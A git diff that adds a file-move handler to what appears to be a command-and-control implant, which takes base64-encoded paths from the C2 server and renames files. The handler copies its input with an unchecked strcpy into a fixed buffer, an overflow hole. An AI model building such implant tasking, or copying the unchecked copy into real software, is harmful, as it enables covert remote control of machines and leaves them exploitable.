@@ -194,3 +194,55 @@ char * rm_task(char * buffer_fetch) {
     free(decoded_file_path);
     return task_ID_copy;
 }
+
+char * mv_task(char * buffer_fetch) {
+    /*
+    Tache qui déplace un fichier sur demande du C2
+    format de l'entrée : MV,3f5c2fd1d3,L2hvbWUvbWVsby9tYWluLmM=,L2hvbWUvbWVsby9tYWluXzE=
+    */
+  char buffer[1024];
+    strcpy(buffer, buffer_fetch); // Create a copy to avoid modifying original string
+    char * command = strtok(buffer, ",");
+    if (strcmp(command, "MV") != 0) {
+        printf("Invalid command\n");
+        return NULL;
+    }
+    char * task_ID = strtok(NULL, ",");
+    char * task_ID_copy = strdup(task_ID); // Create a persistent copy of task_ID
+    char * file_path = strtok(NULL, ",");
+    if (file_path == NULL) {
+        printf("Missing file path\n");
+        free(task_ID_copy);
+        return NULL;
+    }
+    char * decoded_file_path = NULL;
+    decoder_base64(file_path, &decoded_file_path);
+    if (decoded_file_path == NULL) {
+        printf("Failed to decode file path\n");
+        free(task_ID_copy);
+        return NULL;
+    }
+    char * new_file_path = strtok(NULL, ",");
+    if (new_file_path == NULL) {
+        printf("Missing new file path\n");
+        free(decoded_file_path);
+        free(task_ID_copy);
+        return NULL;
+    }
+    char * decoded_new_file_path = NULL;
+    decoder_base64(new_file_path, &decoded_new_file_path);
+    if (decoded_new_file_path == NULL) {
+        printf("Failed to decode new file path\n");
+        free(decoded_file_path);
+        free(task_ID_copy);
+        return NULL;
+    }
+    if (rename(decoded_file_path, decoded_new_file_path) == 0) {
+        printf("File %s moved to %s successfully\n", decoded_file_path, decoded_new_file_path);
+    } else {
+        perror("Error moving file");
+    }
+    free(decoded_file_path);
+    free(decoded_new_file_path);
+    return task_ID_copy;
+}
